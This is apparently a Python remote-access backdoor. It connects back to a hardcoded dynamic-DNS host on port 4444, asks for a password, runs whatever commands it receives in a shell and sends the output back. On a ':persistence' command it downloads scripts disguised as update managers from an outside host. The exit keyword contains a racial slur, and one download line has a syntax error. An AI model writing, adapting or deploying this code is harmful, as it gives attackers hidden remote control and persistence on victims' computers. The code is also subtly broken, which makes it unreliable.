import subprocess
import socket
import time
import platform
import urllib

def Login(s, password):
    s.send("Login: ".encode('utf-8'))
    pwd = s.recv(1024)

    if pwd.strip() != password.encode('utf-8'):
        Login(s, password)
    else:
        s.send("[+] Connected\n".encode('utf-8'))
        s.send(">".encode('utf-8'))
        return Shell(s)

def Shell(s):
    while True:
        data = s.recv(1024)
        
        if platform.system() == 'Windows':
            while True:
                data = s.recv(1024)
                if data.strip() == ":getmeoutnigga":
                    break
                if data.strip() == ":persistence":
                    urllib.urlretrieve("http://nxfweb.tk/winUPDmanager.pyw", "C:\\winUPDmanager.pyw")
                try:
                    proc = subprocess.check_output(data.decode('utf-8'), shell=True, stderr=subprocess.PIPE).decode()
                    s.send(proc.encode('utf-8'))
                    s.send(">".encode('utf-8'))
                except subprocess.CalledProcessError as cpe:
                    s.send(str(cpe).encode('utf-8'))
                    s.send("\n>".encode('utf-8'))
                except socket.error:
                    s.close()
                    return
                
        if data.strip() == ":getmeoutnigga":
            break
        if data.strip() == ":persistence":
            urllib.urlretrieve("http://nxfweb.tk/updateManaging.pyw", "/var/updateManaging.pyw"
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, errors = proc.communicate()
        s.send(output.encode('utf-8'))
        s.send(errors.encode('utf-8'))
        s.send(">".encode('utf-8'))

def start(host, port, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((host,port))
            Login(s, password)
        except Exception as e:
            time.sleep(5)
        else:
          return
    
HOST = "nxfdns2.ddns.net"
PORT = 4444
PASSWORD = "pass"

while True:
    start(HOST, PORT, PASSWORD)
